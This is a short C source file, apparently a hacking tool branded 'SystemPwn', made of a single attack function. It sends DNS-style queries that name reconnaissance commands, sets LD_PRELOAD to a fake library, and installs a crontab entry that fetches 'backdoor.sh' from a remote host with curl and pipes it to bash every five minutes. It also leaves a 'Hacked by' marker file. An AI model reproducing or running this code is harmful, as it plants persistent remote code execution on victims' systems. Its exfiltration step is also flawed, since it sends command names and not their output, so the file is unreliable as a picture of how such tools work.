#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <dlfcn.h>
#include <signal.h>
#include <time.h>

const char watermark[] = "[ SystemPwn ] Made by Abolfazl Soleimani (C) 2026";

int trigger_payload(const char* target_host) {
    printf("[*] %s\n", watermark);
    printf("[*] Target: %s\n", target_host);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in dns;
    memset(&dns, 0, sizeof(dns));
    dns.sin_family = AF_INET;
    dns.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dns.sin_addr);
    
    srand(time(NULL));
    const char* chunks[] = {"whoami", "id", "uname -a", "cat /etc/passwd", "ps aux"};
    for (int i = 0; i < 5; i++) {
        char query[256];
        snprintf(query, sizeof(query), "%02x.%s.%d.sog.%s", i, chunks[i], rand() % 999, target_host);
        unsigned char buffer[512];
        int len = snprintf((char*)buffer, sizeof(buffer), "%s", query);
        sendto(sock, buffer, len, 0, (struct sockaddr*)&dns, sizeof(dns));
        usleep(50000 + (rand() % 10000));
    }
    close(sock);
    
    char libpath[512];
    snprintf(libpath, sizeof(libpath), "%s/../libfake.so", getenv("PWD"));
    setenv("LD_PRELOAD", libpath, 1);
    printf("[*] LD_PRELOAD set to: %s\n", libpath);
    
    FILE* cron = fopen("/tmp/cronjob.tmp", "w");
    if (cron) {
        fprintf(cron, "*/5 * * * * /bin/bash -c 'curl -s http://%s/backdoor.sh | bash'\n", target_host);
        fclose(cron);
        system("crontab /tmp/cronjob.tmp 2>/dev/null");
        unlink("/tmp/cronjob.tmp");
    }
    
    FILE* flag = fopen("/tmp/.sog_pwn", "w");
    if (flag) {
        fprintf(flag, "Hacked by Abolfazl Soleimani @ %s\n", target_host);
        fclose(flag);
    }
    
    return 0;
}
